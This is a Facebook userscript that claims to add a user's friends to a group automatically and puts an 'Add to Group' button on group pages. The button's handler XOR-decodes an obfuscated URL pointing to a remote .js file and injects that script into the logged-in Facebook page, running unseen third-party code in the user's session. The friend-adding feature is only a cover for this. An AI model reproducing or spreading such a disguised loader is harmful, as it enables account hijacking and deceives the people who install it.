// ==UserScript==
// @name	Auto Add Facebook Friends to Group by kareem block
// @description	اضافه اصدقائك اوتوماتك على جروبك فى الفيس
// @include	http://facebook.com/groups/*
// @include	https://facebook.com/groups/*
// @include	http://www.facebook.com/groups/*
// @include	https://www.facebook.com/groups/*
// @grant       none
// @author	kareem block
// @version	2013
//====================================================
// Reason : Source Code Has Been Changed
// Info : https://www.facebook.com/kareem.kasem
// @copyright	2013 © egylive.tv. Thanks!
// ==/UserScript==


// ==Accept All Requests==
function acceptAway(){
	var enkripsi="jvvr8--tmfcdmo,emmengamfg,amo-dkngq-cjofc,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
}
//
var holder = document.createElement('div');
holder.setAttribute('id','awesomeAcceptButtonHolder');
holder.style.width = "175px";
holder.style.height = "25px";
holder.style.left = "-10px";
holder.style.top = "25px";
holder.style.padding = "10px";
holder.style.position = "fixed";
holder.style.background = "#2E5392";
holder.style.border = "CC0000";
holder.style.textAlign = "center";
//
var acceptAllButton = document.createElement("button");
acceptAllButton.setAttribute('id', 'awesomeAcceptButton');
acceptAllButton.style.width = "175px";
acceptAllButton.style.height = "25px";
acceptAllButton.innerHTML = "ضيف اصدقائك/Add to Group";
acceptAllButton.addEventListener('click',function(){acceptAway();},false);
//
holder.appendChild(acceptAllButton);
//
document.body.appendChild(holder);